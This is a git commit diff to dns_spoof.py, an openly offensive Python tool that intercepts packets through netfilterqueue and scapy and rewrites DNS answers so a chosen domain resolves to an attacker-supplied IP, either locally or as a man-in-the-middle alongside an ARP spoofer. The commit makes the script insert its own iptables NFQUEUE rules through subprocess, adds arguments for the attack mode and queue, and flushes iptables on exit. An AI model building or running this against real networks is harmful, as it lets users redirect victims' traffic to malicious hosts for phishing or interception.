bf4263ff95ec5c468c9109c32b85b0f9271aac02
pan0sSt <p.stavrinakis@gmail.com>
2020-06-18 08:42:26 -0400

    Imported subprocess & auto run shell commands

--- dns_spoof.py
+++ dns_spoof.py
@@ -1,21 +1,9 @@
 #!/usr/bin/env python
 
-# -------------BEFORE RUNNING THIS APP-------------
-# To run this locally execute commands
-# iptables -I OUTPUT -j NFQUEUE --queue-num 0
-# iptables -I INPUT -j NFQUEUE --queue-num 0
-
-# To run this as man in the middle execute command
-# iptables -I FORWARD -j NFQUEUE --queue-num 0
-# !! DISCLAIMER: This app doesn't create a man in the middle, you need an arp spoofer running !!
-
-# -------------AFTER QUITTING THIS APP-------------
-# When you are done execute command
-# iptables --flush
-
 import netfilterqueue      # provides access to packets matched by an iptables rule in Linux. Packets so matched can be accepted, dropped, altered, or given a mark.
 import scapy.all as scapy  # handle tasks like scanning and network discovery
 import argparse            # get values as arguments
+import subprocess          # run() function for shell commands
 
 
 # function that handles the user arguments
@@ -23,11 +11,19 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target domain name.")
     parser.add_argument("-i", "--ip", dest="ip", help="Modified IP.")
+    parser.add_argument("-p", "--preference", dest="preference", help="0 for local, 1 for man-in-the-middle.")
+    parser.add_argument("-q", "--queue", dest="queue_num", help="Number(int) of queue.")
     options = parser.parse_args()
     if not options.target:
         parser.error("[-] Please specify a target, use --help for more info.")
     elif not options.ip:
         parser.error("[-] Please specify an ip, use --help for more info.")
+    elif not options.preference in ["0", "1"]:
+        parser.error("[-] Please specify a preference, use --help for more info.")
+    elif not options.queue_num:
+        parser.error("[-] Please specify a queue number, use --help for more info.")
+    elif not options.queue_num.isdigit():
+        parser.error("[-] Queue number must be of type(int), use --help for more info.")
     return options
 
 # main function
@@ -54,10 +50,24 @@ def process_packet(packet):
 
 options = get_arguments()
 target_website = options.target  # globally set
-modified_ip = options.ip         # globally set
-queue   = netfilterqueue.NetfilterQueue()  # object creation
-queue.bind(0, process_packet)  # connect to an existed queue
+modified_ip    = options.ip      # globally set
+queue_num      = options.queue_num
+
+if int(options.preference):
+    # To run this as man in the middle
+    # !! DISCLAIMER: This app doesn't create a man in the middle, you need an arp spoofer running !!
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])
+else:
+    # To run this locally
+    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
+    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
+
+queue = netfilterqueue.NetfilterQueue()     # object creation
+queue.bind(int(queue_num), process_packet)  # connect to an existed queue
+
 try:
     queue.run()
 except KeyboardInterrupt:
-    print("\n[!] Detected CTRL + C ... Quitting...")
+    print("\n[!] Detected CTRL + C ... FlUSHING IPTABLES...")
+    subprocess.run(["iptables", "--flush"])
+    print("[+] Done.")
